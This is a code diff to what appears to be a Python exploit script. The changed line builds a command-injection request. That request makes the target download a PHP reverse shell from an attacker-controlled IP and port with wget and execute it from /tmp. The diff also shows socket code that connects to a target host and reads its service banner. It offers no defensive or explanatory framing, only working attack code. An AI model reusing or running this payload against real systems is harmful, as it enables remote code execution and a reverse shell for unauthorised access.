@@ -38,9 +38,7 @@ def web_server_client():
 
 
 def conn_login():
-    url_req = '{a}&cmd=wget%20http://{b}:{c}/reverse.php%20-O%20/tmp/reverse.php;php%20/tmp/reverse.php'.format(a=url,
-                                                                                                                b=ip,
-                                                                                                                c=port_server)
+    url_req = '{a}&cmd=wget%20http://{b}:{c}/reverse.php%20-O%20/tmp/reverse.php;php%20/tmp/reverse.php'.format(a=url,b=ip,c=port_server)
     with requests.Session() as s:
         if quest == "y":
             # REDIRECT_URL_LOGIN
@@ -72,7 +70,8 @@ try:
         banner()
 
     else:
-        banner()
+        banner()                                                                                                            
+                                                                                                                
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((sys.argv[1], int(sys.argv[2])))
         sock = (str(s.recv(1024)).replace("'", "").replace(r'\r\n', '').strip("b").strip("220"))
